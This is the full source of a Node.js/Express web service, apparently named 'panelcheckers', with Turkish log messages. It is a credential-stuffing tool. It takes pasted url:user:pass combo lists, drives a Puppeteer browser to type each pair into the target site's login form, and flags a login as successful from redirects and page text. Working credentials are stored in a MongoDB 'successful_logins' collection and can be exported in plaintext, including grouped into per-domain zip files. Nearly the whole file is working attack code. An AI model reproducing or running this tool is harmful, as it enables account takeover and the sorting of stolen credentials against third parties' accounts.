require('dotenv').config();
const express = require('express');
const path = require('path');
const os = require('os');
const fs = require('fs').promises;
const crypto = require('crypto');
const puppeteer = require('puppeteer');
const { MongoClient } = require('mongodb');
const JSZip = require('jszip');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';
const IS_PRODUCTION = process.env.NODE_ENV === 'production';
const CHECK_PROGRESS_DELAY_MS = Number(process.env.CHECK_PROGRESS_DELAY_MS || 1000);
const CHECK_PAGE_DELAY_MS = Number(process.env.CHECK_PAGE_DELAY_MS || 1000);
const RESULTS_FILE = process.env.RESULTS_FILE || path.join(os.tmpdir(), 'panelcheckers-results.json');
const SESSION_COOKIE = 'panelcheckers_session';
const SESSION_SECRET = process.env.SESSION_SECRET || 'panelcheckers-dev-secret-change-me';

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let clients = [];
let db = null;
let mongoStatus = {
    configured: false,
    attempted: false,
    connected: false,
    error: null
};

function normalizeUsername(username) {
    return String(username || '').trim().toLowerCase();
}

function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
    const hash = crypto.pbkdf2Sync(String(password), salt, 120000, 32, 'sha256').toString('hex');
    return `${salt}:${hash}`;
}

function verifyPassword(password, storedHash) {
    if (!storedHash || !storedHash.includes(':')) return false;
    const [salt, hash] = storedHash.split(':');
    const candidate = hashPassword(password, salt).split(':')[1];
    return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(candidate, 'hex'));
}

function signValue(value) {
    return crypto.createHmac('sha256', SESSION_SECRET).update(value).digest('base64url');
}

function createSessionCookie(user) {
    const payload = Buffer.from(JSON.stringify({
        id: String(user._id),
        username: user.username,
        role: user.role
    })).toString('base64url');
    return `${payload}.${signValue(payload)}`;
}

function parseCookies(req) {
    return String(req.headers.cookie || '')
        .split(';')
        .map(part => part.trim())
        .filter(Boolean)
        .reduce((acc, part) => {
            const eq = part.indexOf('=');
            if (eq === -1) return acc;
            acc[part.slice(0, eq)] = decodeURIComponent(part.slice(eq + 1));
            return acc;
        }, {});
}

function getSessionUser(req) {
    const token = parseCookies(req)[SESSION_COOKIE];
    if (!token || !token.includes('.')) return null;
    const [payload, signature] = token.split('.');
    if (signature !== signValue(payload)) return null;
    try {
        return JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    } catch {
        return null;
    }
}

function requireAuth(req, res, next) {
    const user = getSessionUser(req);
    if (!user) return res.status(401).json({ error: 'Giriş gerekli.' });
    req.user = user;
    next();
}

function requireAdmin(req, res, next) {
    if (req.user && req.user.role === 'admin') return next();
    return res.status(403).json({ error: 'Admin yetkisi gerekli.' });
}

function safeFileToken(value, fallback = 'anon') {
    return String(value || fallback).replace(/[^a-zA-Z0-9_-]/g, '');
}

function getResultsFile(userId, runId = 'current') {
    const suffix = String(userId || 'anon').replace(/[^a-zA-Z0-9_-]/g, '');
    const runSuffix = safeFileToken(runId, 'current');
    return RESULTS_FILE.replace(/\.json$/i, `-${suffix}-${runSuffix}.json`);
}

function maskPassword(password) {
    const value = String(password || '');
    if (!value) return '';
    if (value.length <= 2) return '*'.repeat(value.length);
    return `${value.slice(0, 1)}${'*'.repeat(Math.max(value.length - 2, 2))}${value.slice(-1)}`;
}

function getDomainFromUrl(value) {
    try {
        return new URL(normalizeUrl(value)).hostname.replace(/^www\./, '').toLowerCase();
    } catch {
        return '';
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function initializeAuthCollections() {
    if (!db) return;
    const users = db.collection('users');
    await users.createIndex({ username: 1 }, { unique: true });
    await db.collection('check_results').createIndex({ ownerUserId: 1, createdAt: -1 });
    await db.collection('successful_logins').createIndex({ ownerUserId: 1, createdAt: -1 });
    await db.collection('session_logs').createIndex({ createdAt: -1 });
    await db.collection('session_logs').createIndex({ username: 1, createdAt: -1 });

    const seeds = [];
    if (process.env.ADMIN_USERNAME && process.env.ADMIN_PASSWORD) {
        seeds.push({
            username: normalizeUsername(process.env.ADMIN_USERNAME),
            role: 'admin',
            passwordHash: hashPassword(process.env.ADMIN_PASSWORD),
            createdAt: new Date()
        });
    }
    if (process.env.USER_USERNAME && process.env.USER_PASSWORD) {
        seeds.push({
            username: normalizeUsername(process.env.USER_USERNAME),
            role: 'user',
            passwordHash: hashPassword(process.env.USER_PASSWORD),
            createdAt: new Date()
        });
    }

    if (!IS_PRODUCTION && seeds.length === 0) {
        seeds.push(
            { username: 'admin', role: 'admin', passwordHash: hashPassword('admin123'), createdAt: new Date() },
            { username: 'user', role: 'user', passwordHash: hashPassword('user123'), createdAt: new Date() }
        );
        console.log('⚠ Dev kullanıcıları oluşturuldu: admin/admin123 ve user/user123');
    }

    if (seeds.length > 0) {
        for (const seed of seeds) {
            await users.updateOne(
                { username: seed.username },
                {
                    $set: {
                        role: seed.role,
                        passwordHash: seed.passwordHash,
                        updatedAt: new Date()
                    },
                    $setOnInsert: {
                        createdAt: seed.createdAt
                    }
                },
                { upsert: true }
            );
        }
        console.log(`✅ ${seeds.length} auth kullanıcısı env değerlerine göre hazırlandı`);
    } else {
        const existingUsers = await users.countDocuments();
        console.log(`✅ Auth kullanıcıları MongoDB'den okunacak. Kayıtlı kullanıcı: ${existingUsers}`);
    }
}

function getRequestIp(req) {
    return String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
        .split(',')[0]
        .trim();
}

async function saveSessionLog(req, event, details = {}) {
    if (!db) return;
    try {
        await db.collection('session_logs').insertOne({
            event,
            userId: details.userId || null,
            username: normalizeUsername(details.username),
            role: details.role || null,
            success: event === 'login_success' || event === 'logout',
            reason: details.reason || '',
            ip: getRequestIp(req),
            userAgent: String(req.headers['user-agent'] || ''),
            createdAt: new Date()
        });
    } catch (err) {
        console.error('Session log kayıt hatası:', err.message);
    }
}

// ------------------ MONGODB BAĞLANTISI (X509 SERTİFİKA DESTEKLİ) ------------------
async function connectMongo() {
    try {
        const uri = process.env.MONGODB_CONNECTIONSTRING || process.env.DATABASE_URL;
        mongoStatus = {
            configured: Boolean(uri),
            attempted: Boolean(uri),
            connected: false,
            error: null
        };
        if (!uri) {
            console.log('⚠ MongoDB connection string bulunamadı, veritabanı kaydı yapılmayacak.');
            mongoStatus.error = 'MongoDB connection string missing';
            return;
        }

        console.log('MongoDB bağlantısı başlatılıyor...');
        let options = {};

        if (uri.includes('MONGODB-X509')) {
            console.log('🔐 X509 authentication modu aktif, sertifika ile bağlanılıyor...');
            const certPath = process.env.MONGODB_CERT_PATH;
            if (certPath && (await fs.access(certPath).then(() => true).catch(() => false))) {
                options = {
                    tlsCertificateKeyFile: certPath,
                    tlsAllowInvalidCertificates: false
                };
                console.log(`🔐 X509 sertifika dosyası kullanılıyor: ${certPath}`);
            } else {
                console.log('⚠ X509 sertifika dosyası bulunamadı. Sadece connection string deneniyor...');
            }
        } else if (process.env.MONGODB_USERNAME && process.env.MONGODB_PASSWORD) {
            options = {
                auth: { username: process.env.MONGODB_USERNAME, password: process.env.MONGODB_PASSWORD }
            };
        }

        const client = new MongoClient(uri, {
            ...options,
            serverSelectionTimeoutMS: 15000
        });
        await client.connect();
        db = client.db();
        mongoStatus.connected = true;
        await initializeAuthCollections();
        console.log('✅ MongoDB bağlantısı başarılı');
        return client;
    } catch (err) {
        console.error('❌ MongoDB bağlantı hatası:', err.message);
        if (err.message.includes('certificate validation failed')) {
            console.error('X509 sertifika hatası. Lütfen geçerli bir sertifika dosyası sağlayın (MONGODB_CERT_PATH) veya farklı bir auth mekanizması kullanın.');
        }
        db = null;
        mongoStatus.connected = false;
        mongoStatus.error = err.message;
        return null;
    }
}

// ------------------ LOG + SSE ------------------
function canReceiveLog(client, ownerUserId) {
    if (!ownerUserId) return true;
    return client.user.role === 'admin' || client.user.id === ownerUserId;
}

function sendLog(msg, type = 'info', ownerUserId = null) {
    const logEntry = { timestamp: new Date().toISOString(), message: msg, type, ownerUserId };
    clients = clients.filter(c => !c.res.destroyed);
    clients.filter(c => canReceiveLog(c, ownerUserId)).forEach(c => c.res.write(`data: ${JSON.stringify(logEntry)}\n\n`));
    console.log(msg);
}

app.get('/api/log-stream', requireAuth, (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    clients.push({ res, user: req.user });
    req.on('close', () => {
        clients = clients.filter(c => c.res !== res);
    });
});

app.get('/health', (req, res) => {
    res.json({
        ok: true,
        service: 'panelcheckers',
        db: db ? 'connected' : 'disabled',
        auth: db ? 'enabled' : 'disabled',
        mongo: {
            configured: mongoStatus.configured,
            attempted: mongoStatus.attempted,
            connected: mongoStatus.connected,
            error: mongoStatus.error,
            env: {
                DATABASE_URL: Boolean(process.env.DATABASE_URL),
                MONGODB_CONNECTIONSTRING: Boolean(process.env.MONGODB_CONNECTIONSTRING),
                MONGODB_USERNAME: Boolean(process.env.MONGODB_USERNAME),
                MONGODB_PASSWORD: Boolean(process.env.MONGODB_PASSWORD)
            }
        },
        uptime: process.uptime()
    });
});

app.post('/api/auth/login', async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok, giriş yapılamaz.' });
        const username = normalizeUsername(req.body && req.body.username);
        const password = String((req.body && req.body.password) || '');
        if (!username || !password) {
            await saveSessionLog(req, 'login_failed', { username, reason: 'missing_credentials' });
            return res.status(400).json({ error: 'Kullanıcı adı ve şifre gerekli.' });
        }

        const user = await db.collection('users').findOne({ username });
        if (!user || !verifyPassword(password, user.passwordHash)) {
            await saveSessionLog(req, 'login_failed', { username, reason: 'invalid_credentials' });
            return res.status(401).json({ error: 'Kullanıcı adı veya şifre hatalı.' });
        }

        const cookie = createSessionCookie(user);
        const secure = IS_PRODUCTION ? '; Secure' : '';
        res.setHeader('Set-Cookie', `${SESSION_COOKIE}=${encodeURIComponent(cookie)}; HttpOnly; SameSite=Lax; Path=/; Max-Age=604800${secure}`);
        await saveSessionLog(req, 'login_success', {
            userId: String(user._id),
            username: user.username,
            role: user.role
        });
        res.json({ user: { id: String(user._id), username: user.username, role: user.role } });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/auth/logout', async (req, res) => {
    const user = getSessionUser(req);
    if (user) {
        await saveSessionLog(req, 'logout', {
            userId: user.id,
            username: user.username,
            role: user.role
        });
    }
    res.setHeader('Set-Cookie', `${SESSION_COOKIE}=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0`);
    res.json({ ok: true });
});

app.get('/api/auth/me', requireAuth, (req, res) => {
    res.json({ user: req.user });
});

// ------------------ URL DÜZELTME ------------------
function normalizeUrl(url) {
    url = url.trim();
    if (url.startsWith('//')) url = 'https:' + url;
    if (!url.startsWith('http')) url = 'https://' + url;
    return url;
}

// ------------------ GELİŞMİŞ PARSER ------------------
function parseCredentialLine(line) {
    line = line.trim();
    if (!line) return null;
    if (line.startsWith('###')) return null;

    let url = null;
    let username = null;
    let password = null;

    if (line.includes('://')) {
        // URL'yi yakala (host'a kadar, port vs. dahil değil)
        const urlMatch = line.match(/^(https?:\/\/[^:]+)/);
        if (urlMatch) {
            url = urlMatch[1];
            // URL'den sonraki kısmı al ve başındaki TÜM ':' karakterlerini temizle
            let rest = line.substring(url.length).replace(/^:+/, '');
            const colonIndex = rest.indexOf(':');
            if (colonIndex !== -1) {
                username = rest.substring(0, colonIndex);
                password = rest.substring(colonIndex + 1);
            } else {
                // Eğer hiç ':' yoksa, rest'in tamamı username, password boş
                username = rest;
                password = '';
            }
        } else {
            username = line;
            password = '';
        }
    } else {
        const colonIndex = line.indexOf(':');
        if (colonIndex !== -1) {
            username = line.substring(0, colonIndex);
            password = line.substring(colonIndex + 1);
        } else {
            username = line;
            password = '';
        }
    }
    // Kullanıcı adı boş gelirse geçersiz say
    if (!username || username.trim() === '') {
        return null;
    }
    return { url, username, password };
}

function buildStoredResult(result, owner) {
    return {
        ownerUserId: owner.id,
        ownerUsername: owner.username,
        ownerRole: owner.role,
        url: result.baseUrl,
        domain: getDomainFromUrl(result.baseUrl),
        username: result.username,
        passwordMasked: maskPassword(result.password),
        passwordLength: String(result.password || '').length,
        success: Boolean(result.success),
        message: result.message || '',
        checkedAt: result.timestamp ? new Date(result.timestamp) : new Date(),
        createdAt: new Date()
    };
}

async function saveCheckResult(result, owner) {
    if (!db) return;
    try {
        await db.collection('check_results').insertOne(buildStoredResult(result, owner));
    } catch (err) {
        console.error('Check sonucu kayıt hatası:', err);
        sendLog(`❌ Check sonucu kayıt hatası: ${err.message}`, 'error', owner.id);
    }
}

// ------------------ BAŞARILI GİRİŞİ MONGODB'YE KAYDET ------------------
async function saveSuccessfulLogin(result, owner) {
    if (!db) return;
    try {
        const collection = db.collection('successful_logins');
        await collection.insertOne(buildStoredResult(result, owner));
        sendLog(`💾 Başarılı giriş MongoDB'ye kaydedildi: ${result.username} @ ${result.baseUrl}`, 'success', owner.id);
    } catch (err) {
        console.error('MongoDB kayıt hatası:', err);
        sendLog(`❌ MongoDB kayıt hatası: ${err.message}`, 'error', owner.id);
    }
}

// ------------------ İZOLE SESSION İLE TEST (DAHA YAVAŞ, GÖRÜNÜR) ------------------
async function runAllTests(testItems, owner, runId) {
    const resultsFile = getResultsFile(owner.id, runId);
    const results = testItems.map(item => ({
        baseUrl: item.baseUrl,
        username: item.username,
        password: item.password,
        success: null,
        message: 'SIRADA',
        timestamp: new Date().toISOString()
    }));
    await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));

    const total = testItems.length;
    sendLog(`🚀 BAŞLANGIÇ – ${total} test (her kullanıcı için ayrı izole session)`, 'info', owner.id);
    sendLog(IS_PRODUCTION ? '🌐 Render ortamında browser headless çalışır, pencere açılmaz.' : '🪟 Lokal ortamda browser penceresi açılıyor.', 'info', owner.id);
    sendLog('🧭 Browser motoru başlatılıyor...', 'info', owner.id);

    let browser = null;
    try {
        browser = await puppeteer.launch({
            headless: IS_PRODUCTION ? 'new' : false,
            slowMo: IS_PRODUCTION ? 0 : 250,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process'
            ]
        });
        sendLog('✅ Browser motoru hazır.', 'success', owner.id);
    } catch (err) {
        const message = `Browser başlatılamadı: ${err.message}`;
        sendLog(`❌ ${message}`, 'error', owner.id);
        const failedAt = new Date().toISOString();
        for (const result of results) {
            result.success = false;
            result.message = message;
            result.timestamp = failedAt;
            await saveCheckResult(result, owner);
        }
        await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
        sendLog(`🏁 BİTİŞ – Browser başlatılamadığı için ${total} test çalıştırılamadı.`, 'error', owner.id);
        return results;
    }

    for (let i = 0; i < total; i++) {
        const { baseUrl, username, password } = testItems[i];
        sendLog(`📌 Test ${i+1}/${total}: ${username} @ ${baseUrl}`, 'info', owner.id);
        sendLog(`🧪 Yeni izole session açılıyor: ${username}`, 'info', owner.id);

        const result = results[i];
        result.success = null;
        result.message = 'ÇALIŞIYOR';
        result.timestamp = new Date().toISOString();
        await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
        await delay(CHECK_PROGRESS_DELAY_MS);

        let context = null;
        let page = null;
        try {
            context = await browser.createBrowserContext();
            page = await context.newPage();
            const url = normalizeUrl(baseUrl);
            await page.goto(url, { waitUntil: 'networkidle2', timeout: 20000 });
            await delay(CHECK_PROGRESS_DELAY_MS);

            let userInput = await page.$('input[type="text"], input[name="username"], input[name="email"], input[name="user"], input[id*="user"], input[id*="email"], input[id="userid"]');
            let passInput = await page.$('input[type="password"]');
            let submitBtn = await page.$('button[type="submit"], input[type="submit"], form button');

            if (!userInput || !passInput || !submitBtn) {
                throw new Error('Login form not found');
            }

            await userInput.click({ clickCount: 3 });
            await userInput.type(username);
            await delay(CHECK_PROGRESS_DELAY_MS);
            await passInput.type(password);
            await delay(CHECK_PROGRESS_DELAY_MS);
            await submitBtn.click();

            await delay(CHECK_PAGE_DELAY_MS);
            const finalUrl = page.url();
            const html = await page.content().catch(() => '');

            let success = false;
            const lowerHtml = html.toLowerCase();
            if (lowerHtml.includes('invalid') || lowerHtml.includes('wrong') || 
                lowerHtml.includes('error') || lowerHtml.includes('failed') || 
                lowerHtml.includes('incorrect')) {
                success = false;
            }
            else if (finalUrl !== url && !finalUrl.includes('login') && !finalUrl.includes('signin')) {
                success = true;
            }
            else if (lowerHtml.includes('dashboard') || lowerHtml.includes('welcome') || lowerHtml.includes('account')) {
                success = true;
            }
            else {
                success = false;
            }

            result.success = success;
            result.message = success ? 'LOGIN OK' : 'LOGIN FAIL';
            sendLog(success ? `✅ BAŞARILI ${username}` : `❌ BAŞARISIZ ${username}`, success ? 'success' : 'fail', owner.id);

            if (success) {
                await saveSuccessfulLogin(result, owner);
            }

        } catch (err) {
            result.success = false;
            result.message = err.message;
            sendLog(`⚠ HATA ${username}: ${err.message}`, 'error', owner.id);
        } finally {
            if (page) {
                await page.close().catch(() => {});
            }
            if (context) {
                await context.close().catch(() => {});
            }
            sendLog(`🧹 Session kapatıldı: ${username}`, 'info', owner.id);
        }

        await saveCheckResult(result, owner);
        await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
        await delay(CHECK_PROGRESS_DELAY_MS);
    }

    await browser.close();
    const okCount = results.filter(x => x.success).length;
    sendLog(`🏁 BİTİŞ – Başarılı: ${okCount} / Başarısız: ${total - okCount}`, 'info', owner.id);
    return results;
}

// ------------------ API ------------------
app.post('/api/start', requireAuth, async (req, res) => {
    try {
        let { credsText } = req.body;
        credsText = credsText || '';

        const rawCredLines = credsText.split('\n')
            .map(l => l.trim())
            .filter(l => l && !l.startsWith('###'));

        const parsedCreds = [];
        for (const line of rawCredLines) {
            const p = parseCredentialLine(line);
            if (p && p.url && p.username) {
                parsedCreds.push(p);
            } else {
                sendLog(`⚠ Geçersiz satır atlandı: ${line}`, 'error', req.user.id);
            }
        }

        const testItems = parsedCreds.map(cred => ({
            baseUrl: cred.url,
            username: cred.username,
            password: cred.password || ''
        }));

        if (testItems.length === 0) {
            return res.status(400).json({ error: 'Geçerli test verisi yok. Format: url:user:pass' });
        }

        const runId = crypto.randomUUID();
        res.json({ message: 'Test başladı', total: testItems.length, runId });
        runAllTests(testItems, req.user, runId).catch(err => {
            console.error('Test runner fatal error:', err);
            sendLog(`❌ Test çalıştırıcı durdu: ${err.message}`, 'error', req.user.id);
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/results', requireAuth, async (req, res) => {
    try {
        const runId = req.query.runId;
        if (!runId) return res.json([]);
        const data = await fs.readFile(getResultsFile(req.user.id, runId), 'utf8');
        res.json(JSON.parse(data));
    } catch {
        res.json([]);
    }
});

app.get('/api/download', requireAuth, async (req, res) => {
    try {
        const runId = req.query.runId;
        if (!runId) return res.status(400).send('Run ID yok');
        const data = JSON.parse(await fs.readFile(getResultsFile(req.user.id, runId), 'utf8'));
        const success = data.filter(x => x.success);
        const fail = data.filter(x => !x.success);
        let output = '✅ BAŞARILI\n\n';
        success.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password}\n`);
        output += '\n❌ BAŞARISIZ\n\n';
        fail.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password}\n`);
        res.setHeader('Content-Disposition', 'attachment; filename=result.txt');
        res.send(output);
    } catch {
        res.status(500).send('Sonuç dosyası yok');
    }
});

function safeDomainFilename(domain) {
    return String(domain || 'domainsiz')
        .toLowerCase()
        .replace(/^www\./, '')
        .replace(/[^a-z0-9.-]+/g, '_')
        .replace(/^_+|_+$/g, '') || 'domainsiz';
}

app.post('/api/group-download', requireAuth, async (req, res) => {
    try {
        const groups = req.body && req.body.groups;
        if (!Array.isArray(groups) || groups.length === 0) {
            return res.status(400).json({ error: 'Gruplanacak veri yok.' });
        }

        const zip = new JSZip();
        let fileCount = 0;
        for (const group of groups) {
            const domain = safeDomainFilename(group.domain);
            const lines = Array.isArray(group.lines)
                ? group.lines.map(line => String(line || '').trim()).filter(Boolean)
                : [];
            if (!lines.length) continue;
            zip.file(`${domain}.txt`, lines.join('\n') + '\n');
            fileCount += 1;
        }

        if (fileCount === 0) {
            return res.status(400).json({ error: 'Gruplanacak satır yok.' });
        }

        const buffer = await zip.generateAsync({ type: 'nodebuffer' });
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', 'attachment; filename=domain-bazli-listeler.zip');
        res.send(buffer);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

async function historyQueryForUser(req, onlySuccessful = false) {
    if (!db) return [];
    const collection = db.collection(onlySuccessful ? 'successful_logins' : 'check_results');
    const query = {};
    if (req.user.role !== 'admin') query.ownerUserId = req.user.id;
    return collection.find(query, {
        projection: {
            passwordLength: 0
        }
    }).sort({ createdAt: -1 }).limit(500).toArray();
}

app.get('/api/history/checks', requireAuth, async (req, res) => {
    try {
        res.json(await historyQueryForUser(req, false));
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/history/successful', requireAuth, async (req, res) => {
    try {
        res.json(await historyQueryForUser(req, true));
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/users', requireAuth, requireAdmin, async (req, res) => {
    try {
        if (!db) return res.json([]);
        const users = await db.collection('users').find({}, {
            projection: { passwordHash: 0 }
        }).sort({ username: 1 }).toArray();
        res.json(users);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/session-logs', requireAuth, requireAdmin, async (req, res) => {
    try {
        if (!db) return res.json([]);
        const logs = await db.collection('session_logs')
            .find({})
            .sort({ createdAt: -1 })
            .limit(500)
            .toArray();
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/results', requireAuth, async (req, res) => {
    try {
        const runId = req.query.runId;
        if (runId) {
            await fs.writeFile(getResultsFile(req.user.id, runId), '[]');
        }
        res.json({ ok: true });
    } catch {
        res.status(500).json({ error: 'Silme hatası' });
    }
});

// ------------------ SERVER BAŞLATMA ------------------
(async () => {
    await connectMongo();
    const server = app.listen(PORT, HOST, () => console.log(`✅ Sunucu çalışıyor: http://${HOST}:${PORT}`));
    server.on('error', (err) => {
        console.error(`❌ Sunucu başlatılamadı (${HOST}:${PORT}):`, err.message);
        process.exit(1);
    });
})();
